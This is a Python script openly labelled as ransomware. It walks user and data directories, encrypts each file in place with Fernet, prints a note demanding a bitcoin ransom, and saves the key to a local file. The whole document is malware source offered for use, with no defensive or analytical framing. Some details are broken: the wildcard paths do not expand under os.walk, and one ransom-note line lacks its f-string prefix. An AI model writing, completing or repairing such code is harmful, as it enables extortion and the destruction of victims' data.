import os
import random
import string
import base64
import cryptography
from cryptography.fernet import Fernet

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Encrypt a file using the provided key
def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        file_data = file.read()
    
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(file_data)
    
    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

# Decrypt a file using the provided key
def decrypt_file(file_path, key):
    with open(file_path, "rb") as encrypted_file:
        encrypted_data = encrypted_file.read()
    
    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    
    with open(file_path, "wb") as decrypted_file:
        decrypted_file.write(decrypted_data)

# Generate a random ransom note
def generate_ransom_note():
    ransom_note = f"Your files have been encrypted! To retrieve your data, you must pay a ransom of {random.randint(100, 1000)} bitcoins.\n\n"
    ransom_note += "Send the payment to the following address: {base64.b64encode(os.urandom(32)).decode('utf-8')}\n\n"
    ransom_note += "Once the payment is confirmed, you will receive the decryption key."
    return ransom_note

# Main ransomware execution
def execute_ransomware():
    # Generate a random encryption key
    encryption_key = generate_key()
    
    # Iterate through important directories and encrypt files
    important_dirs = ["C:\\Users\\*", "D:\\Data\\*"]
    for directory in important_dirs:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, encryption_key)
    
    # Generate and display the ransom note
    ransom_note = generate_ransom_note()
    print(ransom_note)
    
    # Save the decryption key for later use
    with open("decryption_key.txt", "wb") as key_file:
        key_file.write(encryption_key)

if __name__ == "__main__":
    execute_ransomware()